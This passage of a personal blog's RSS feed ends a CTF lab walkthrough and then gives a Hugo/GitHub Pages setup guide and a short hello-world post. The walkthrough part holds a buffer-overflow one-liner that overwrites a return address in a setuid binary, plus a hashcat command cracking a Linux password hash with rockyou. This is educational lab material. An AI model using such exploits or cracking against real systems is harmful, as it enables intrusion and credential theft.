<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">      python <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;print &#34;A&#34;*44 + &#34;</span><span style="color:#ae81ff">\xcb\x84\x04\x08</span><span style="color:#e6db74">&#34;&#39;</span> <span style="color:#f92672">|</span> <span style="color:#f92672">/</span>opt<span style="color:#f92672">/</span>secret<span style="color:#f92672">/</span>root
</code></pre></div><p>Save the hash!</p>
<h2 id="task-10-finish-the-job">Task 10. Finish the job</h2>
<p>Finally the last task. For this last one we need two things:</p>


<ul>
<li>The hash that we found in last task </li>
<li>A little bit of patience</li>

<p>Luckily hashcat supports cracking linux password hashes. You can find a list of hashcat modes <a href="https://hashcat.net/wiki/doku.php?id=example_hashes" target="_blank" >here</a> and <a href="https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt" target="_blank" >rockyou</a>(a popular wordlist) here (if you don&rsquo;t already have it on your system yet)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"> hashcat -m <span style="color:#ae81ff">1800</span> -a <span style="color:#ae81ff">0</span> pingu.hash /usr/share/wordlists/rockyou.txt
</code></pre></div>
    <img src="/images/thecodcaper/5.gif"  class="center"  style="border-radius: 3px;"  />


<p>Flags:</p>
<p><code>-a</code> = Specify attack mode,attack modes can be found in the man page.</p>
<p><code>-m</code> = Specifies which mode to use, refer back to the list of modes</p>

    <img src="/images/thecodcaper/finalpass.jpg"  class="center"  style="border-radius: 8px;"  />


<p>We did it!</p>


<blockquote>

THM suggestion reading:
</blockquote>

<p><a href="http://docs.pwntools.com/en/stable/" target="_blank" >http://docs.pwntools.com/en/stable/</a></p>
<p><a href="https://browserpwndbg.readthedocs.io/en/docs/" target="_blank" >https://browserpwndbg.readthedocs.io/en/docs/</a></p>
]]></content>
        </item>
        
        <item>
            <title>Static web page with Hugo and Git Hub</title>
            <link>https://nmmorette.github.io/posts/2021/06/static-web-page-with-hugo-and-git-hub/</link>
            <pubDate>Wed, 30 Jun 2021 00:00:00 +0000</pubDate>
            
            <guid>https://nmmorette.github.io/posts/2021/06/static-web-page-with-hugo-and-git-hub/</guid>
            <description>Step 1. Install Hugo Go to Hugo releases and download the appropriate version for your OS and architecture.
More complete instructions are available at Install Hugo
Step 2. Configure your Git Hub Pages You need a github account for this step.
Step 3 Choose a theme In Hugo theme pages choose your favorite theme and download to your computer.
Unzip the files into the hugo default theme folder: ./Sites/YOURSITE/Themes
Then copy the content of config.</description>
            <content type="html"><![CDATA[<h2 id="step-1-install-hugo">Step 1. Install Hugo</h2>
<p>Go to <a href="https://github.com/spf13/hugo/releases" target="_blank" >Hugo releases</a> and download the
appropriate version for your OS and architecture.</p>
<p>More complete instructions are available at <a href="https://gohugo.io/getting-started/installing/" target="_blank" >Install Hugo</a></p>
<h2 id="step-2-configure-your-git-hub-pages">Step 2. Configure your Git Hub Pages</h2>
<p>You need a github account for this step.</p>
<h2 id="step-3-choose-a-theme">Step 3 Choose a theme</h2>
<p>In <a href="http://themes.hugo.io/" target="_blank" >Hugo theme pages</a> choose your favorite theme and download to your computer.</p>
<p>Unzip the files into the hugo default theme folder: ./Sites/YOURSITE/Themes</p>
<p>Then copy the content of config.toml file in theme folder to the config.toml in your default site folder./Sites/YOUSITE/config.toml</p>
<h2 id="step-4-running-hugo">Step 4 Running Hugo</h2>
<p>With a terminal set in your default hugo webpage run:</p>
<pre><code>hugo -D
</code></pre>
<p>Hugo will building your page acording with the selected theme.</p>
<p>Open a terminal in your site page and start hugo</p>
<pre><code>hugo server
</code></pre>
<p>Then open your local site in: <code>http://localhost:1313</code></p>
<p>You can open yhe Site folder with Visual Studio and start code your site.</p>
<h2 id="step-4-upload-site">Step 4 Upload site</h2>
<p>Now  just upload the Public folder to your github.</p>
<p>Tips for Hugo&rsquo;s markdown:</p>
<p><a href="https://www.philipdaniels.com/blog/2016/hugo-blogging-cheatsheet/" target="_blank" >https://www.philipdaniels.com/blog/2016/hugo-blogging-cheatsheet/</a></p>
]]></content>
        </item>
        
        <item>
            <title>Hello World</title>
            <link>https://nmmorette.github.io/posts/2021/06/hello-world/</link>
            <pubDate>Fri, 25 Jun 2021 00:00:00 +0000</pubDate>
            
            <guid>https://nmmorette.github.io/posts/2021/06/hello-world/</guid>
            <description>Created with Hugo/hello-friend-ng theme and GitHub pages.</description>
            <content type="html"><![CDATA[<p>Created with Hugo/hello-friend-ng theme and GitHub pages.</p>
]]></content>
        </item>
        
    </channel>
</rss>
